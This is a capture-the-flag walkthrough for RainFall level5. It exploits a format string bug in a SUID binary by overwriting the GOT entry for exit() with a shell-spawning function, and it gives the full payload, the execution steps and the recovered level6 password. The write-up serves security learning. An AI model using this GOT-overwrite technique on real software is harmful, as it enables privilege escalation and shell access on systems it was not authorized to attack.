# RainFall: Level5 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level5@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level5@RainFall:~$ ls -l
-rwsr-s---+ 1 level6 users 7552 Aug 30  2022 level5
```

This binary is SUID-owned by `level6`. Our goal is to exploit a format string vulnerability to overwrite the GOT entry for `exit()` with the address of the function `o()`, which spawns a shell.

---

## Step 2: Source Code Summary

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void o() {
    system("/bin/sh");
    exit(1);
}

void n() {
    char buffer[512];
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);
    exit(1);
}

int main(int argc, char** argv, char** envp) {
    n();
}
```

* The function `n()` contains a format string vulnerability in `printf(buffer)`.
* Our goal is to redirect execution to `o()` by overwriting the GOT entry for `exit()`.

---

## Step 3: Identify Function and GOT Addresses

Disassemble functions:

```gdb
(gdb) info functions
...
0x080484a4  o
```

Address of `o()` is:

```c
0x080484a4
```

Find GOT entries:

```bash
objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

So:

* Lower half address: `0x08049838`
* Upper half address: `0x0804983a`

---


## Step 4: Find Stack Offsets

```bash
(gdb) run <<< $(python -c 'print("AAAABBBB" + ".%x."*30)')
```

Assume offset for addresses is `%4$hn` and `%5$hn`.

---

## Step 5: Calculate Padding for Format String

We want to write `0x080484a4` into the `exit` GOT entry using two `%hn` writes:

* Split into:

  * Upper 16 bits: `0x0804` = 2052
  * Lower 16 bits: `0x84a4` = 33956

Calculate paddings:

```bash
first_padding = 2052 - 8 = 2044
second_padding = 33956 - 2052 = 31904
```

Construct payload:

```bash
python -c 'print("\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn")' > /tmp/level5.exploit
```

---

## Step 6: Execute the Exploit

```bash
(cat /tmp/level5.exploit; cat) | ./level5
```

This overwrites `exit()` with `o()`, and executing `exit(1)` jumps to `o()`, spawning a shell.

---

## Step 7: Retrieving the Flag

```bash
$ whoami
level6
$ cat /home/user/level6/.pass
**d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31**
```

---

## Step 8: Move to Level06

```bash
level5@RainFall:~$ su level6
Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
